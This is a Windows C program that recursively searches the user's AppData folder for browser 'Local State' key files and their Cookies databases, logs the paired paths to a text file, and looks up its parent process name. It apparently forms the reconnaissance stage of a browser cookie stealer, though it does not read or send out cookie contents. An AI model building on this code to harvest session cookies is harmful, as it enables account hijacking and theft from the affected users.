#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <tlhelp32.h>



#define MAX_PATH_LENGTH 4096
#define INITIAL_FILES 100000  // Start with a reasonable initial size


DWORD GetParentProcessId();

// Struct to hold file paths
typedef struct {
    char localState[MAX_PATH_LENGTH];
    char cookies[MAX_PATH_LENGTH];
} FilePaths;

// Function declarations
void search_in_subdirectories(const char *dir_path, FilePaths **results, int *count, int *capacity);
void find_appdata_path(char *appdata_path);
void write_output_to_file(const FilePaths *results, int count, const char *filename);

// Get the user's APPDATA path and initiate the search
void FindFile() {
    char appdata_path[MAX_PATH];

    // Get the user's APPDATA path
    find_appdata_path(appdata_path);
    printf("Scanning in AppData directory: %s\n", appdata_path);  // Debug output

    // Dynamically allocate initial space for found paths
    int capacity = INITIAL_FILES;
    FilePaths *results = malloc(capacity * sizeof(FilePaths));
    if (results == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }
    
    int count = 0;

    // Start searching for files in the APPDATA directory
    search_in_subdirectories(appdata_path, &results, &count, &capacity);

    // Write results to a file
    const char *output_filename = "output.txt";
    write_output_to_file(results, count, output_filename);
    printf("Results written to %s\n", output_filename);

    // Free allocated memory
    free(results);
}

// Function to find the APPDATA path
void find_appdata_path(char *appdata_path) {
    char local_appdata[MAX_PATH];

    // Get the local APPDATA path (Local)
    if (SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, local_appdata) != S_OK) {
        printf("Failed to get AppData path\n");
        return;
    }

    // Build the APPDATA path by traversing back to the user folder
    char *last_backslash = strrchr(local_appdata, '\\');
    if (last_backslash != NULL) {
        *last_backslash = '\0'; // Truncate to get the path to the user folder
    }

    // Now append 'AppData' and set the output
    snprintf(appdata_path, MAX_PATH_LENGTH, "%s", local_appdata);
}

void search_in_subdirectories(const char *dir_path, FilePaths **results, int *count, int *capacity) {
    WIN32_FIND_DATA find_data;
    HANDLE hFind;
    char search_path[MAX_PATH_LENGTH];

    // Create the search pattern (dir_path\*)
    snprintf(search_path, MAX_PATH_LENGTH, "%s\\*", dir_path);
    printf("Searching in: %s\n", dir_path);  // Debug output

    // Start the search
    hFind = FindFirstFile(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Could not find any files in directory: %s\n", dir_path);
        return; // Return if directory is not found
    }

    do {
        // Skip the current and parent directory entries (.) and (..)
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        // Create the full path of the current entry
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, MAX_PATH_LENGTH, "%s\\%s", dir_path, find_data.cFileName);

        // Print each file or directory found
        printf("Found: %s (Directory: %s)\n", full_path, (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "Yes" : "No");

        // Check if the current entry is a directory
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursively search in this subdirectory
            search_in_subdirectories(full_path, results, count, capacity);
        } else {
            // Check for "Local State" file
            if (strcmp(find_data.cFileName, "Local State") == 0) {
                // Allocate more space if necessary
                if (*count >= *capacity) {
                    *capacity *= 2;
                    *results = realloc(*results, *capacity * sizeof(FilePaths));
                    if (*results == NULL) {
                        fprintf(stderr, "Memory reallocation failed\n");
                        return;
                    }
                }
                strncpy((*results)[*count].localState, full_path, MAX_PATH_LENGTH - 1);
                (*results)[*count].localState[MAX_PATH_LENGTH - 1] = '\0'; // Ensure null termination

                // Check for the corresponding "Cookies" file in the same directory
                char cookies_path[MAX_PATH_LENGTH];
                snprintf(cookies_path, MAX_PATH_LENGTH, "%s\\Default\\Network\\Cookies", dir_path);
                printf("Checking for Cookies at: %s\n", cookies_path);  // Debug output

                WIN32_FIND_DATA cookies_data;
                HANDLE hCookiesFind = FindFirstFile(cookies_path, &cookies_data);
                if (hCookiesFind != INVALID_HANDLE_VALUE) {
                    strncpy((*results)[*count].cookies, cookies_path, MAX_PATH_LENGTH - 1);
                    (*results)[*count].cookies[MAX_PATH_LENGTH - 1] = '\0'; // Ensure null termination
                    FindClose(hCookiesFind);
                } else {
                    strcpy((*results)[*count].cookies, "Not found");
                }

                (*count)++; // Increment count of found items
            }
        }
    } while (FindNextFile(hFind, &find_data));

    FindClose(hFind);
}




// Function to write the output to a file
void write_output_to_file(const FilePaths *results, int count, const char *filename) {
    FILE *file = fopen(filename, "w");
    if (!file) {
        printf("Error opening file for writing: %s\n", filename);
        return;
    }

    fprintf(file, "| Local State Path                                           | Cookies Path                                          |\n");
    fprintf(file, "|----------------------------------------------------------|------------------------------------------------------|\n");

    for (int i = 0; i < count; i++) {
        // Only write the entry if both paths are found
        if (strcmp(results[i].localState, "Not found") != 0 && strcmp(results[i].cookies, "Not found") != 0) {
            fprintf(file, "| %s | %s |\n", results[i].localState, results[i].cookies);
        }
    }

    fclose(file);
}



void print_parent_process_name() {
    DWORD ppid = GetParentProcessId(); // Get the parent process ID
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (pe32.th32ProcessID == ppid) {
                printf("Parent process name: %s\n", pe32.szExeFile);
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    } else {
        perror("Process32First");
    }

    CloseHandle(hProcessSnap);
}

// Function to get the parent process ID
DWORD GetParentProcessId() {
    HANDLE hProcess = GetCurrentProcess();
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    DWORD parent_pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        if (Process32First(hSnap, &pe32)) {
            do {
                if (pe32.th32ProcessID == GetCurrentProcessId()) {
                    parent_pid = pe32.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return parent_pid;
}
